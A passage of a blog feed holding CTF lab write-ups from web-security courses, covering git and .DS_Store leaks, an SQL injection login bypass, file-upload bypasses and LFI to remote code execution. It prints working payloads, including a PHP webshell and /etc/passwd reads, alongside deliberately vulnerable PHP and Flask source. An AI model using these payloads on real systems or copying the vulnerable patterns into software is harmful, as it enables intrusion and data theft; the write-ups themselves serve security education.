 &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://note.ctf.zoolab.org/">https://note.ctf.zoolab.org/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.wibibi.com/info.php?tid=402">&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-javascript!" data-lang="javascript!">...
&amp;lt;script&amp;gt;
 const id = location.pathname.split(&amp;#39;/&amp;#39;).pop();

 fetch(`/api/note/${id}`).then(r =&amp;gt; r.json()).then(({ title, content })=&amp;gt;{
 url.value = location;
 titleNode.innerHTML = title;
 contentNode.innerText = content;
 }); 
&amp;lt;/script&amp;gt;
...
&lt;/code>&lt;/pre>&lt;p>For instance, if our &lt;code>$id=47a8aad1b3b82dcd4decd36d&lt;/code>, the &lt;code>script code&lt;/code> will fetch this data as &lt;code>json&lt;/code> file and parse title and content.
&lt;img src="https://i.imgur.com/Nwj6gCQ.png" alt="" />
Then it&amp;rsquo;ll change &lt;code>titleNode&lt;/code> by &lt;code>innerHTML&lt;/code> and change &lt;code>contentNode&lt;/code> by &lt;code>innerText&lt;/code>.
&lt;img src="https://i.imgur.com/H8VdiIb.png" alt="" />&lt;/p></description></item><item><title>Simple Web 0x01(Lab - `gitleak`)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/information-leak/simple-web-0x01lab---gitleak/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/information-leak/simple-web-0x01lab---gitleak/</guid><description>&lt;h1 id="simple-web-0x01lab---gitleak">
 Simple Web 0x01(Lab - &lt;code>gitleak&lt;/code>)
 &lt;a class="anchor" href="#simple-web-0x01lab---gitleak">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:9000/">http://h4ck3r.quest:9000/&lt;/a>&lt;/p>
&lt;h2 id="exploit---gitleak--basic-git-command">
 Exploit - gitleak + basic Git command
 &lt;a class="anchor" href="#exploit---gitleak--basic-git-command">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Use the extension of Firefox(or Google), &lt;code>Dotgit&lt;/code>, to check if the website actually has &lt;code>git leak problem&lt;/code>
&lt;img src="https://i.imgur.com/ZtMbj9z.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>denny0223/scrabble
To use scrabble tool to leak information&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ git clone https://github.com/denny0223/scrabble.git
$ cd scrabble
$ sudo ./scrabble http://h4ck3r.quest:9000/
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>Still no flag
There&amp;rsquo;s &lt;code>flag.php&lt;/code> but still no flag in there. &lt;code>HEAD&lt;/code> said &lt;code>HEAD is now at a0228bd Remove flag.&lt;/code>
Thus, we can look up the history by the command below.&lt;/p></description></item><item><title>Simple Web 0x01(Lab - Hello from Windows 98)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x01lab---hello-from-windows-98/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x01lab---hello-from-windows-98/</guid><description>&lt;h1 id="simple-web-0x01lab---hello-from-windows-98">
 Simple Web 0x01(Lab - Hello from Windows 98)
 &lt;a class="anchor" href="#simple-web-0x01lab---hello-from-windows-98">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-web-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://windows.ctf.zoolab.org/">https://windows.ctf.zoolab.org/&lt;/a>&lt;/p>
&lt;p>Very similar to &lt;a href="https://bernie6401.github.io/nGAjlvyURtOcRBW1XfCfOA">0x07(Lab - &lt;code>HakkaMD&lt;/code>)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php!=" data-lang="php!="> &amp;lt;?php
 session_start();
 if(isset($_GET[&amp;#39;source&amp;#39;])){
 highlight_file(&amp;#39;./&amp;#39;.$_GET[&amp;#39;source&amp;#39;].&amp;#39;.php&amp;#39;);
 die();
 }
 if(isset($_GET[&amp;#39;name&amp;#39;]) &amp;amp;&amp;amp; $_GET[&amp;#39;name&amp;#39;]!=&amp;#39;&amp;#39;){
 $_SESSION[&amp;#39;name&amp;#39;] = $_GET[&amp;#39;name&amp;#39;];
 header(&amp;#34;Location: /?page=hi.php&amp;#34;);
 die();
 }
 if(!isset($_GET[&amp;#39;page&amp;#39;])){
 header(&amp;#34;Location: /?page=say.php&amp;#34;);
 die();
 }
?&amp;gt;
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
 &amp;lt;title&amp;gt;Hello from Windows 98&amp;lt;/title&amp;gt;
 &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt;
 &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;https://unpkg.com/98.css&amp;#34; /&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;style&amp;gt;
 body{
 background: url(&amp;#39;blue.png&amp;#39;);
 background-size: cover;
 display: flex;
 align-items: center;
 justify-content: center;
 height: 100vh;
 margin: 0;
 }
&amp;lt;/style&amp;gt;
&amp;lt;/style&amp;gt;
&amp;lt;body&amp;gt;
 &amp;lt;div class=&amp;#34;window&amp;#34; style=&amp;#34;margin: 32px; width: 500px&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;title-bar&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;title-bar-text&amp;#34;&amp;gt;
 Hello World..
 &amp;lt;/div&amp;gt;
 &amp;lt;div class=&amp;#34;title-bar-controls&amp;#34;&amp;gt;
 &amp;lt;button aria-label=&amp;#34;Minimize&amp;#34;&amp;gt;&amp;lt;/button&amp;gt;
 &amp;lt;button aria-label=&amp;#34;Maximize&amp;#34;&amp;gt;&amp;lt;/button&amp;gt;
 &amp;lt;button aria-label=&amp;#34;Close&amp;#34;&amp;gt;&amp;lt;/button&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;div class=&amp;#34;window-body&amp;#34;&amp;gt;
 &amp;lt;?php include($_GET[&amp;#39;page&amp;#39;]);?&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x02(Lab - `.DS_Store`)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/information-leak/simple-web-0x02lab---.ds_store/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/information-leak/simple-web-0x02lab---.ds_store/</guid><description>&lt;h1 id="simple-web-0x02lab---ds_store">
 Simple Web 0x02(Lab - &lt;code>.DS_Store&lt;/code>)
 &lt;a class="anchor" href="#simple-web-0x02lab---ds_store">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:9001/">http://h4ck3r.quest:9001/&lt;/a>&lt;/p>
&lt;h2 id="exploit---ds_store">
 Exploit - &lt;code>.DS_Store&lt;/code>
 &lt;a class="anchor" href="#exploit---ds_store">#&lt;/a>
&lt;/h2>
&lt;p>Clone &lt;code>lijiejie/ds_store_exp&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ git clone https://github.com/lijiejie/ds_store_exp.git
$ python ds_store_exp.py http://h4ck3r.quest:9001/.DS_Store
[200] http://h4ck3r.quest:9001/.DS_Store
[200] http://h4ck3r.quest:9001/super_secret_meowmeow.php
[200] http://h4ck3r.quest:9001/index.php
$ cd h4ck3r.quest_9001
$ cat super_secret_meowmeow.php
FLAG{.DS_Store is so annoying lmao}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Note that, must install &lt;code>python 2&lt;/code>, &lt;code>requests&lt;/code>, &lt;code>ds_store&lt;/code> and modify &lt;code>queue&lt;/code>(&lt;code>import queue&lt;/code>→&lt;code>import Queue as queue&lt;/code>)
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ conda create --name py2.7 python=2.7
$ conda install -c auto ds_store
$ conda install -c anaconda requests
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://bobbyhadz.com/blog/python-no-module-named-queue">python-no-module-named-queue&lt;/a>&lt;/p></description></item><item><title>Simple Web 0x03(Lab - Log me in + Revenge)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/sql-injection/simple-web-0x03lab---log-me-in-+-revenge/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/sql-injection/simple-web-0x03lab---log-me-in-+-revenge/</guid><description>&lt;h1 id="simple-web-0x03lab---log-me-in--revenge">
 Simple Web 0x03(Lab - Log me in + Revenge)
 &lt;a class="anchor" href="#simple-web-0x03lab---log-me-in--revenge">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8200/">http://h4ck3r.quest:8200/&lt;/a>
Challenge: &lt;a href="http://h4ck3r.quest:8201/">http://h4ck3r.quest:8201/&lt;/a>&lt;/p>
&lt;h2 id="exploit---sqli">
 Exploit - &lt;code>SQLi&lt;/code>
 &lt;a class="anchor" href="#exploit---sqli">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Payload → &lt;code>') or ('1'='1') -- #&lt;/code>
SELECT * FROM admin WHERE (username=&amp;rsquo;&amp;rsquo;) or (&amp;lsquo;1&amp;rsquo;=&amp;lsquo;1&amp;rsquo;) &amp;ndash; #&amp;rsquo;) AND (password=&amp;lsquo;MTIz&amp;rsquo;)&lt;/li>
&lt;/ul>
&lt;p>Flag: &lt;code>FLAG{b4by_sql_inj3cti0n}&lt;/code>&lt;/p>
&lt;h2 id="revenge-source-code">
 Revenge source code
 &lt;a class="anchor" href="#revenge-source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python!=" data-lang="python!=">from flask import Flask, render_template, redirect, request, g, Response
import sqlite3

app = Flask(__name__)


def get_db():
 db = getattr(g, &amp;#39;_database&amp;#39;, None)
 if db is None:
 db = g._database = sqlite3.connect(&amp;#39;/tmp/database.db&amp;#39;)
 db.row_factory = sqlite3.Row
 return db


@app.before_first_request
def init_db():
 cursor = get_db().cursor()
 cursor.execute(&amp;#34;&amp;#34;&amp;#34;
 CREATE TABLE IF NOT EXISTS &amp;#34;admin&amp;#34; (
 &amp;#34;username&amp;#34; TEXT NOT NULL,
 &amp;#34;password&amp;#34; TEXT NOT NULL
 )
 &amp;#34;&amp;#34;&amp;#34;)
 cursor.execute(&amp;#34;SELECT COUNT(*) as count FROM admin WHERE username=&amp;#39;admin&amp;#39;&amp;#34;)
 count = cursor.fetchone()[&amp;#39;count&amp;#39;]
 if count == 0:
 import secrets
 cursor.execute(&amp;#34;INSERT INTO admin (username, password) VALUES (?,?)&amp;#34;,
 (&amp;#39;admin&amp;#39;, secrets.token_urlsafe()))
 get_db().commit()


@app.teardown_appcontext
def close_connection(exception):
 db = getattr(g, &amp;#39;_database&amp;#39;, None)
 if db is not None:
 db.close()


@app.route(&amp;#34;/&amp;#34;)
def home():
 return render_template(&amp;#34;index.html&amp;#34;,
 failed=request.args.get(&amp;#39;failed&amp;#39;) != None)


@app.route(&amp;#34;/login&amp;#34;, methods=[&amp;#39;POST&amp;#39;])
def login():
 username = request.form.get(&amp;#39;username&amp;#39;)
 password = request.form.get(&amp;#39;password&amp;#39;)

 if not username or not password:
 return redirect(&amp;#34;/?failed&amp;#34;)

 cur = get_db().execute(f&amp;#34;SELECT * FROM admin WHERE (username=&amp;#39;{username}&amp;#39;)&amp;#34;)
 res = cur.fetchone()
 cur.close()

 if res[&amp;#39;username&amp;#39;] == &amp;#39;admin&amp;#39; and res[&amp;#39;password&amp;#39;] == password:
 return &amp;#34;FLAG: FLAG{&amp;lt;REDACTED&amp;gt;}&amp;#34;

 return redirect(&amp;#34;/?failed&amp;#34;)



@app.route(&amp;#34;/source&amp;#34;)
def source():
 import re
 source_code = open(__file__).read()
 source_code = re.sub(r&amp;#39;FLAG{[^}\s]+}&amp;#39;, &amp;#39;FLAG{&amp;lt;REDACTED&amp;gt;}&amp;#39;, source_code, 1)
 return Response(source_code, mimetype=&amp;#39;text/plain&amp;#39;)


if __name__ == &amp;#39;__main__&amp;#39;:
 app.run(debug=True)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x04(Lab - Image Space 0x01)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/upload/simple-web-0x04lab---image-space-0x01/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/upload/simple-web-0x04lab---image-space-0x01/</guid><description>&lt;h1 id="simple-web-0x04lab---image-space-0x01">
 Simple Web 0x04(Lab - Image Space 0x01)
 &lt;a class="anchor" href="#simple-web-0x04lab---image-space-0x01">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:9010">http://h4ck3r.quest:9010&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php!=" data-lang="php!="> &amp;lt;?php
 if (isset($_GET[&amp;#39;source&amp;#39;])) {
 highlight_file(__FILE__);
 exit;
 }
?&amp;gt;
&amp;lt;h1&amp;gt;Image Uploader&amp;lt;/h1&amp;gt;
&amp;lt;p&amp;gt;Only supports: jpg, jpeg, png&amp;lt;/p&amp;gt;
&amp;lt;!-- upload form --&amp;gt;
&amp;lt;form action=&amp;#34;index.php&amp;#34; method=&amp;#34;POST&amp;#34; enctype=&amp;#34;multipart/form-data&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;file&amp;#34; name=&amp;#34;image_file&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Upload&amp;#34;&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;p&amp;gt;
 &amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;View Source&amp;lt;/a&amp;gt;
&amp;lt;/p&amp;gt;
&amp;lt;?php
 if (!isset($_FILES[&amp;#39;image_file&amp;#39;])) {
 die(&amp;#39;Give me a file!&amp;#39;);
 }

 $filename = basename($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;name&amp;#39;]);

 $prefix = bin2hex(random_bytes(8));
 move_uploaded_file($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;tmp_name&amp;#39;], &amp;#34;images/${prefix}_${filename}&amp;#34;);
 echo &amp;#34;&amp;lt;img src=\&amp;#34;images/${prefix}_${filename}\&amp;#34;&amp;gt;&amp;#34;;
?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x05(Lab - Image Space 0x02)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/upload/simple-web-0x05lab---image-space-0x02/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/upload/simple-web-0x05lab---image-space-0x02/</guid><description>&lt;h1 id="simple-web-0x05lab---image-space-0x02">
 Simple Web 0x05(Lab - Image Space 0x02)
 &lt;a class="anchor" href="#simple-web-0x05lab---image-space-0x02">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:9011">http://h4ck3r.quest:9011&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php!=" data-lang="php!="> &amp;lt;?php
 if (isset($_GET[&amp;#39;source&amp;#39;])) {
 highlight_file(__FILE__);
 exit;
 }
?&amp;gt;
&amp;lt;h1&amp;gt;Image Uploader&amp;lt;/h1&amp;gt;
&amp;lt;p&amp;gt;Only supports: jpg, jpeg, png&amp;lt;/p&amp;gt;
&amp;lt;form action=&amp;#34;index.php&amp;#34; method=&amp;#34;POST&amp;#34; enctype=&amp;#34;multipart/form-data&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;file&amp;#34; name=&amp;#34;image_file&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Upload&amp;#34;&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;p&amp;gt;
 &amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;View Source&amp;lt;/a&amp;gt;
&amp;lt;/p&amp;gt;
&amp;lt;?php
 if (!isset($_FILES[&amp;#39;image_file&amp;#39;])) {
 die(&amp;#39;Give me a file!&amp;#39;);
 }

 $filename = basename($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;name&amp;#39;]);
 $extension = strtolower(explode(&amp;#34;.&amp;#34;, $filename)[1]);

 if (!in_array($extension, [&amp;#39;png&amp;#39;, &amp;#39;jpeg&amp;#39;, &amp;#39;jpg&amp;#39;]) !== false) {
 die(&amp;#34;Invalid file extension: $extension.&amp;#34;);
 }

 $prefix = bin2hex(random_bytes(8));
 move_uploaded_file($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;tmp_name&amp;#39;], &amp;#34;images/${prefix}_${filename}&amp;#34;);
 echo &amp;#34;&amp;lt;img src=\&amp;#34;/images/${prefix}_${filename}\&amp;#34;&amp;gt;&amp;#34;;
?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x06(Lab - Image Space 0x03)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/upload/simple-web-0x06lab---image-space-0x03/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/upload/simple-web-0x06lab---image-space-0x03/</guid><description>&lt;h1 id="simple-web-0x06lab---image-space-0x03">
 Simple Web 0x06(Lab - Image Space 0x03)
 &lt;a class="anchor" href="#simple-web-0x06lab---image-space-0x03">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:9012">http://h4ck3r.quest:9012&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://en.wikipedia.org/wiki/List_of_file_signatures">file signature&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php!=" data-lang="php!="> &amp;lt;?php
 if (isset($_GET[&amp;#39;source&amp;#39;])) {
 highlight_file(__FILE__);
 exit;
 }
?&amp;gt;
&amp;lt;h1&amp;gt;Image Uploader&amp;lt;/h1&amp;gt;
&amp;lt;p&amp;gt;Only supports: jpg, jpeg, png&amp;lt;/p&amp;gt;
&amp;lt;form action=&amp;#34;index.php&amp;#34; method=&amp;#34;POST&amp;#34; enctype=&amp;#34;multipart/form-data&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;file&amp;#34; name=&amp;#34;image_file&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Upload&amp;#34;&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;p&amp;gt;
 &amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;View Source&amp;lt;/a&amp;gt;
&amp;lt;/p&amp;gt;
&amp;lt;?php
 if (!isset($_FILES[&amp;#39;image_file&amp;#39;])) {
 die(&amp;#39;Give me a file!&amp;#39;);
 }

 $filename = basename($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;name&amp;#39;]);
 $extension = strtolower(explode(&amp;#34;.&amp;#34;, $filename)[1]);

 if (!in_array($extension, [&amp;#39;png&amp;#39;, &amp;#39;jpeg&amp;#39;, &amp;#39;jpg&amp;#39;]) !== false) {
 die(&amp;#34;Invalid file extension: $extension.&amp;#34;);
 }

 if (in_array($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;type&amp;#39;], [&amp;#34;image/png&amp;#34;, &amp;#34;image/jpeg&amp;#34;, &amp;#34;image/jpg&amp;#34;]) === false) {
 die(&amp;#34;Invalid file type: &amp;#34; . $_SERVER[&amp;#34;CONTENT_TYPE&amp;#34;]);
 }

 list($_, $_, $type) = getimagesize($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;tmp_name&amp;#39;]);

 if ($type !== IMAGETYPE_JPEG &amp;amp;&amp;amp; $type !== IMAGETYPE_PNG) {
 die(&amp;#34;Invalid image type.&amp;#34;);
 }

 $prefix = bin2hex(random_bytes(8));
 move_uploaded_file($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;tmp_name&amp;#39;], &amp;#34;images/${prefix}_${filename}&amp;#34;);
 echo &amp;#34;&amp;lt;img src=\&amp;#34;/images/${prefix}_${filename}\&amp;#34;&amp;gt;&amp;#34;;
?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::
It has 2 extra constraint must be bypassed. Use &lt;code>burpsuite&lt;/code> and change valid file signature&lt;/p></description></item><item><title>Simple Web 0x07(Lab - `HakkaMD`)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/lfi/simple-web-0x07lab---hakkamd/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/lfi/simple-web-0x07lab---hakkamd/</guid><description>&lt;h1 id="simple-web-0x07lab---hakkamd">
 Simple Web 0x07(Lab - &lt;code>HakkaMD&lt;/code>)
 &lt;a class="anchor" href="#simple-web-0x07lab---hakkamd">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8401">http://h4ck3r.quest:8401&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10241555">資安這條路-Local File Inclusion&lt;/a>&lt;/p>
&lt;h2 id="exploit---lfi-to-rce">
 Exploit - LFI to RCE
 &lt;a class="anchor" href="#exploit---lfi-to-rce">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>First things first, the website has &lt;code>LFI&lt;/code> problem
&lt;code>http://h4ck3r.quest:8401/?module=/etc/passwd&lt;/code>
&lt;img src="https://i.imgur.com/Efl4E0c.png" alt="" />&lt;/li>
&lt;li>&lt;font color="FF0000">&lt;strong>通靈&lt;/strong>&lt;/font>
It provided &lt;code>phpinfo()&lt;/code> so that we can check the save address of session.
&lt;img src="https://i.imgur.com/SO727sY.png" alt="" />
The setting is default, thus we can use &lt;code>LFI&lt;/code> to read session file:
&lt;code>http://h4ck3r.quest:8401/?module=/tmp/sess_0qvmvnk5lh140239e6ol9l16h1&lt;/code>
&lt;img src="https://i.imgur.com/AiLGZJA.png" alt="" />
We can see that session file store the data of what we enter. Therefore, we could enter &lt;code>webshell&lt;/code> to get shell&lt;/li>
&lt;li>&lt;code>webshell&lt;/code>
&lt;code>&amp;lt;?php system($_GET['sh']); ?&amp;gt;&lt;/code>
↓
&lt;code>http://h4ck3r.quest:8401/?module=/tmp/sess_2f0dilri9ju4553th2bkclefal&amp;amp;sh=ls%20/&lt;/code>
↓
&lt;img src="https://i.imgur.com/kqlIf6z.png" alt="" />
↓
&lt;code>http://h4ck3r.quest:8401/?module=/tmp/sess_2f0dilri9ju4553th2bkclefal&amp;amp;sh=cat%20/flag_aff6136bbef82137&lt;/code>&lt;/li>
&lt;li>Then we got flag!!!&lt;/li>
&lt;/ol></description></item><item><title>Simple Web 0x08(Lab - My First Meow Website)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/lfi/simple-web-0x08lab---my-first-meow-website/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/lfi/simple-web-0x08lab---my-first-meow-website/</guid><description>&lt;h1 id="simple-web-0x08lab---my-first-meow-website">
 Simple Web 0x08(Lab - My First Meow Website)
 &lt;a class="anchor" href="#simple-web-0x08lab---my-first-meow-website">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8400/">http://h4ck3r.quest:8400/&lt;/a>
Target: Login as Admin&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10245020">PHP 偽協議 (一) &lt;/a>
&lt;a href="https://youtu.be/_hasOTGximc?t=2855">Web Security 0x1&lt;/a>&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Observe
According to the URL, &lt;code>http://h4ck3r.quest:8400/?page=inc/home&lt;/code>, it might have &lt;code>LFI&lt;/code> problem.&lt;/li>
&lt;li>Use &lt;code>php://filter&lt;/code> to read page
&lt;code>http://h4ck3r.quest:8400/?page=php://filter/convert.base64-encode/resource=inc/home&lt;/code>
:::spoiler page source code
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;

&amp;lt;head&amp;gt;
 &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;
 &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;
 &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;
 &amp;lt;title&amp;gt;Meow&amp;lt;/title&amp;gt;
 &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;https://cdn.jsdelivr.net/npm/bulma@0.9.2/css/bulma.min.css&amp;#34;&amp;gt;
&amp;lt;/head&amp;gt;

&amp;lt;body&amp;gt;
 &amp;lt;nav class=&amp;#34;navbar is-dark&amp;#34; role=&amp;#34;navigation&amp;#34; aria-label=&amp;#34;main navigation&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;navbar-brand&amp;#34;&amp;gt;
 &amp;lt;a class=&amp;#34;navbar-item&amp;#34; href=&amp;#34;/?page=inc/home&amp;#34;&amp;gt;🐱&amp;lt;/a&amp;gt;
 &amp;lt;/div&amp;gt;

